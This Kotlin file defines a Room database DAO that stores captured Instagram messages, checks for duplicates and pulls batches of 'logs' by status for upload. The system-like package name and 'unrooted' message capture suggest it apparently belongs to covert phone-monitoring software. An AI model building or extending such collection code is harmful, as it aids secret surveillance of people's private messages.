package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.InstagramUnrooted
import com.android.services.util.AppConstants

@Dao
interface InstagramUnrootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(snapChatUnrooted: InstagramUnrooted)

    @Query("Select uniqueId from instagram_unrooted_table where uniqueId = :messageId")
    fun checkInstagramIfAlreadyExist(messageId: String): String?

    @Query("Select * from instagram_unrooted_table where status = :status order by id ASC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllInstagramUnrootedLogs(status: Int): List<InstagramUnrooted>

    @Query("Update instagram_unrooted_table set status = :updated_status where id BETWEEN :startId AND :endId")
    fun update(startId: Int, endId: Int, updated_status: Int): Int
}